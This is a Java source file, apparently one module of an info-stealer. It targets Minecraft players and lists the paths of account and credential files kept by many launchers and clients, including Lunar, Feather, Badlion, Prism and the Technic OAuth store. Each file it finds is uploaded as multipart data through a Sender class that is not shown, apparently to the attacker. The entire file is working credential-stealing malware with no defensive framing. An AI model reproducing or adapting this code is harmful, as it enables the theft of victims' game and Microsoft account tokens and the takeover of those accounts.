package io.github.luxotick.impl;

import io.github.luxotick.Sender;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.File;
import java.io.IOException;

public class Minecraft {
    public static void sendMinecraft() throws IOException {
        String AB = "/.minecraft/";
        String mc = System.getenv("APPDATA") + AB;

        String[] minecraftFilePaths = {
                "/essential/microsoft_accounts.json",
                "/config/ias.json",
                "/LabyMod/accounts.json",
                "/Impact/alts.json",
                "/meteor-client/accounts.nbt",
                "/Badlion Client/accounts.json",
                "/.feather/accounts.json",
                "/PolyMC/accounts.json",
                "/PrismLauncher/accounts.json",
                "/.technic/oauth/StoredCredential",
                "/.lunarclient/settings/game/accounts.json"
        };

        OkHttpClient client = new OkHttpClient();
        MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);

        for (int i = 0; i < minecraftFilePaths.length; i++) {
            File file = new File(mc + minecraftFilePaths[i]);
            if (file.exists()) {
                Sender.sendMessage("Found " + file.getName() + " file.");
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", file.getName(), RequestBody.create(okhttp3.MediaType.parse("application/octet-stream"), file))
                        .build();
                Sender.sendFile(client, requestBody);
            }
        }
    }
}
